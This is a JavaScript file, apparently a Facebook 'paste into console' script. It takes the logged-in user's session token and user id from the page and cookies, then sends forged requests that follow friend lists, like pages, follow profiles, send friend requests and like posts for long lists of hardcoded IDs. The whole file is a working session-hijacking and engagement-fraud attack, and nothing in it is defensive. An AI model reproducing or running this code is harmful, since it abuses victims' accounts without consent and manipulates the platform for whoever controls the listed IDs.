/*Follow List*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function LIST(L) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
  var XParams = "flid=" + L +"&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user="+user_id+"&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
LIST("312907035509203");
LIST("567376543307348");
LIST("562836113761391");
LIST("352246548208596");
LIST("4399231940310");
LIST("10200819572312984");
LIST("10200820950347434");
LIST("10200819976883098");
LIST("10200865018889120");
LIST("466396010097340");
LIST("466380243430111");
LIST("381489938632591");
LIST("611411958872392");
LIST("551467628239578");
LIST("358808870905474");
LIST("325715414223519");
LIST("538818886161261");
LIST("156489554515051");
LIST("359722610800552");
LIST("146971562150041");
LIST("503774323004340");
LIST("177777859044364");
LIST("296332940501763");
LIST("252854598187657");
LIST("461311090622996");
LIST("452505254839947");
LIST("577657768945892");
LIST("187420968074311"); 
LIST("529897107069041"); 
LIST("174006526095409"); 
LIST("134985716695149"); 
LIST("134703450056709"); 
LIST("292061244263668");
LIST("129137250622385");
LIST("207200769427300");
LIST("340613049401880");
LIST("344495279013657");
LIST("344496235680228");
LIST("399019036879681");
LIST("245094282297376");
LIST("279163185561807");
LIST("254790537994417");
LIST("277815575688383");
LIST("599238170088731");
LIST("358317087623422");
LIST("186680718157525");
LIST("611422528882551");
/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("313072532101076");
Like("190451517757758");
Like("595580513789645");
Like("300241633420701");
Like("231125826929893");
Like("456401041060837");
Like("523004351084154");
Like("229353647087574");
Like("229488947108546");  
Like("205908352819272");   
Like("313072532101076");  
Like("209464459125570");  
Like("523004351084154");   
Like("200776629976061");  
Like("147857465295449");  
Like("163588093717517");  
Like("291092130903328");  
Like("429143760437630");  
Like("149394451859931");
Like("306495312809675");   
Like("238044532932475");
Like("533658463364561");
Like("528019587257023");
Like("114432912090688");
Like("165411580286132");
Like("333193263435488");
Like("104142816349744");
Like("379373108754478");
Like("184210961735249");
Like("569302423102592");
Like("234982333218667");
Like("456483724412226");
Like("136785296514054");
Like("146320572185345");
Like("150423395088679");
Like("651209744905814");
Like("605644426114536");
Like("476744145734993");
Like("190943597728424");
Like("127402680785850");
Like("453718184719532");
Like("177430755751025");
Like("110871649075947");
Like("280308438768084");
/*Auto Follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "/ajax/follow/follow_profile.php?__a=1";
  var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}
a("100003697277263");
a("100003846224832");
a("100001050235420");
a("100001375288085");
a("100003231350883");
a("100001610096787");
a("100004459350389");
a("100002760409500");  
a("100003996410930");  
a("100002753085498");    
a("100001597470562");  
a("100003236292409"); 
a("100002514625419");  
a("100003719477594");  
a("100003323922152");  
a("100003641105051");  
a("100003766050046");  
a("100003291769896");  
a("100003231350883");  
a("100003822041168");  
a("100003793848333");  
a("100003790742474");  
a("100003579341486");  
a("100003531745127");  
a("100004164938729"); 
a("100003751777172");
a("100002263264013");
a("100003898640819");
a("100002747023938");
a("100004043843895");
a("100002414280218");
a("100004537747892");
a("1142706767");
a("100005017236507");
a("100000608668866");
a("100000101944587");
a("100002488981157");
a("100004365428219");
a("100002792035803");
a("100003087733234");
a("100002432997648");
a("100004581879770"); 
a("100001462694562"); 
a("100004192268178"); 
a("100005511630697"); 
a("100002166394323"); 
a("100004459350389");
a("100004097120937");
a("100004467935003");
a("100004121340012");
a("100005783323902");
a("100003785647375");
a("100003595638172");
a("100003904189992");
a("100003147643648");
a("100003239135946");
a("100000076612063");
a("100003171263802");
a("100003354001028");
a("100000444278020");

/*Add Friend*/ 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
IDS("100004021942009");
IDS("100003977780572");
IDS("100004043843895");
IDS("100004121340012");

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now=(new Date).getTime();
function P(post) {
  var X = new XMLHttpRequest();
  var XURL ="//www.facebook.com/ajax/ufi/like.php";
  var XParams = "like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}    
P("582362518475417");
P("586772274701108");
P("583963808315288");
P("586570844721251");
P("585557111489291");
P("458762124214883");
P("458760640881698");
P("493088494069487");
P("493083820736621");
P("491205797591090");
P("462706753774328");
P("461398507238486");
